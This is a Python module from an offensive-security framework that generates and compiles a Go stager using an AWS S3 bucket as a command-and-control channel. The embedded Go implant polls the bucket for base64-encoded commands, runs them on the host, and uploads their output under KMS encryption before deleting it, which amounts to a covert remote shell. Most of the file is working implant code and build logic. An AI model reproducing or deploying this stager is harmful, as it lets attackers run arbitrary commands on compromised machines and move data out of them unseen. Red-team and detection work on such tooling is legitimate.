import base64
import os
import string
import random
import sys
import subprocess
import mongoengine

from core.database.models import S3C2Listener, S3C2Particle

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = False

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "LISTENER-BUCKET-NAME": {
        "value": "",
        "required": "true",
        "description": "The listener bucket name to use as C2."
    },
    "OUTPUT-FILE-NAME": {
        "value": "",
        "required": "true",
        "description": "The name of the output file to be dumped inside ./stager directory."
    },
    "GOOS": {
        "value": "linux",
        "required": "true",
        "description": "The type of OS to execute the binary in."
    },
    "GOARCH": {
        "value": "amd64",
        "required": "true",
        "description": "The architecture to execute the binary at."
    }

}
description = "A Go stager for AWS S3 listener"

aws_command = "None"

def python_code_generate(bucket, accesskey, secretkey, region, commandkey, outputkey, kmskey, goos, goarch):
    gocode = f"""

package main

var accessKey = "{accesskey}"
var secretKey = "{secretkey}"
var bucket = "{bucket}"
var key = "{commandkey}"
var newKey = "{outputkey}"
var kmsKeyID = "{kmskey}"
var region = "{region}"

"""

    oldgocode = f"""
package main

import (
    "bytes"
    "context"
    "io/ioutil"
    "encoding/base64"
    
    "github.com/aws/aws-sdk-go-v2/aws"
    "github.com/aws/aws-sdk-go-v2/config"
    "github.com/aws/aws-sdk-go-v2/credentials"
    "github.com/aws/aws-sdk-go-v2/service/s3"
    "github.com/aws/aws-sdk-go-v2/service/s3/types"

    "os"
    "math/rand"
    "time"
    "os/exec"
    "strings"
)

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

var seededRand *rand.Rand = rand.New(
       rand.NewSource(time.Now().UnixNano()))

func StringWithCharset(length int, charset string) string {{
       b := make([]byte, length)
       for i := range b {{
        b[i] = charset[seededRand.Intn(len(charset))]
       }}
       return string(b)
}}

func String(length int) string {{
       return StringWithCharset(length, charset)
}}

func fileExists(filename string) bool {{
    info, err := os.Stat(filename)
    if os.IsNotExist(err) {{
        return false
    }}
    return !info.IsDir()
}}

func decodeBase64(encoded string) (string, error) {{
    decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
    if err != nil {{}}
    return string(decodedBytes), nil
}}

func main() {{
    region := "us-east-1"

    accessKey := "{accesskey}"
    secretKey := "{secretkey}"

    cfg, err := config.LoadDefaultConfig(context.TODO(),
        config.WithRegion(region),
        config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
    )
    if err != nil {{}}

    s3Client := s3.NewFromConfig(cfg)

       bucket := "{bucket}"
       key := "{commandkey}"
       newKey := "{outputkey}"
    kmsKeyID := "{kmskey}"

    particlename := ""

    if fileExists("./.particle") {{
        pn, _ := ioutil.ReadFile("./.particle")
        particlename = string(pn)
        if particlename == "" {{
            particlename := String(10)
            f, err := os.Create("./.particle")
            _, err = f.WriteString(particlename)
            if err != nil{{}}
        }}

    }}else {{
        particlename = String(10)
        f, err := os.Create("./.particle")
        _, err = f.WriteString(particlename)
        if err != nil{{}}
    }}

    particlepath := particlename + "/"
    particlecommand := particlepath + key
    particleoutput := particlepath + newKey

    for {{
        _, err = s3Client.GetObject(context.TODO() ,&s3.GetObjectInput{{
                Bucket: aws.String(bucket),
                Key:    aws.String(particlepath),
            }})

        if err != nil {{
            _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
                Bucket: aws.String(bucket),
                Key:    aws.String(particlepath),
                ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                SSEKMSKeyId:          aws.String(kmsKeyID),
            }})
        }}

        getObjectOutput, err := s3Client.GetObject(context.TODO(), &s3.GetObjectInput{{
            Bucket: aws.String(bucket),
            Key:    aws.String(particlecommand),
        }})

        if err == nil {{
            defer getObjectOutput.Body.Close()

            encodedString, err := ioutil.ReadAll(getObjectOutput.Body)
            commandString, err := decodeBase64(string(encodedString))
            if err != nil {{}}
            if err == nil {{
                if commandString == "exit_particle_shell"{{
                    break
                }}
                commands := strings.Split(commandString, " ")
                
                command := commands[0]
                args := commands[1:]
                
                cmd := exec.Command(command, args...)

                output, err := cmd.CombinedOutput()
                if err != nil {{
                    _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
                        Bucket: aws.String(bucket),
                        Key:    aws.String(particleoutput),
                        Body:   bytes.NewReader([]byte(err.Error())),
                        ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                        SSEKMSKeyId:          aws.String(kmsKeyID),
                    }})
                    if err != nil {{}}
                    
                    _, err = s3Client.DeleteObject(context.TODO(), &s3.DeleteObjectInput{{
                        Bucket: aws.String(bucket),
                        Key:    aws.String(particleoutput),
                    }})
                }}

                if err == nil{{
                    _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{{
                        Bucket: aws.String(bucket),
                        Key:    aws.String(particleoutput),
                        Body:   bytes.NewReader(output),
                        ServerSideEncryption: types.ServerSideEncryptionAwsKms,
                        SSEKMSKeyId:          aws.String(kmsKeyID),
                    }})
                    if err != nil {{}}
                    _, err = s3Client.DeleteObject(context.TODO(), &s3.DeleteObjectInput{{
                        Bucket: aws.String(bucket),
                        Key:    aws.String(particleoutput),
                    }})
                }}
            }}
        }}
    }}
}}
    """

    with open("core/module/stager/__golang_s3_stager/credentials.go", "w") as credsfile:
        credsfile.write(gocode)
        credsfile.close()

    b64Bytes = buildbinary(goos=goos, goarch=goarch)
    os.remove("core/module/stager/__golang_s3_stager/credentials.go")
    os.remove("core/module/stager/__golang_s3_stager/go.mod")
    os.remove("core/module/stager/__golang_s3_stager/go.sum")

    return b64Bytes

def buildbinary(goos, goarch):
    work_dir = "core/module/stager/__golang_s3_stager"

    try:
        subprocess.run(["go", "mod", "init", "stager"], cwd=work_dir, check=True)

        # Run go mod tidy
        subprocess.run(["go", "mod", "tidy"], cwd=work_dir, check=True)

        env = os.environ.copy()
        env["GOOS"] = goos
        env["GOARCH"] = goarch

        subprocess.run(
            ["go", "build", "-o", "stager"],
            cwd=work_dir,
            check=True,
            env=env
        )

        binary_path = os.path.join(work_dir, "stager")
        with open(binary_path, "rb") as f:
            return {"code": base64.b64encode(f.read()).decode()}

    except subprocess.CalledProcessError as e:
        return {"error": f"Go build failed: {str(e)}"}

def exploit(workspace):
    bucket = variables['LISTENER-BUCKET-NAME']['value']
    try:
        s3c2data = S3C2Listener.objects.get(listener_bucket_name=bucket)

    except mongoengine.DoesNotExist:
        if workspace is not None:
            s3c2data = workspace
            bucket = s3c2data['listener_bucket_name']
        else:
            return {"error": "Listener does not exist. Create it first place."}

    accesskey = s3c2data['listener_particle_access_key']
    secretkey = s3c2data['listener_particle_secret_key']
    region = s3c2data['listener_region']
    outputfile = s3c2data['listener_output_file']
    commandkey = s3c2data['listener_command_file']
    kmskey = s3c2data['listener_kms_key_arn']

    goos = variables['GOOS']['value']
    goarch = variables['GOARCH']['value']
    outputfilename = variables['OUTPUT-FILE-NAME']['value']

    b64Bytes = python_code_generate(
        bucket=bucket,
        accesskey=accesskey,
        secretkey=secretkey,
        region=region,
        commandkey=commandkey,
        outputkey=outputfile,
        kmskey=kmskey,
        goos=goos,
        goarch=goarch
    )

    #if type(b64Bytes) != str:
    #    b64Bytes = b64Bytes.decode()

    if "error" in b64Bytes:
        return {
            "error": b64Bytes['error']
        }

    if b64Bytes is None:
        return {
            "error": "Failed to create the binary",
        }

    return {
        "ModuleName": {
            "ModuleName": "Golang for S3 C2",
            "Status": "Successfully created",
            "Code": b64Bytes['code'],
            "OutPutFile": outputfilename
        }
    }

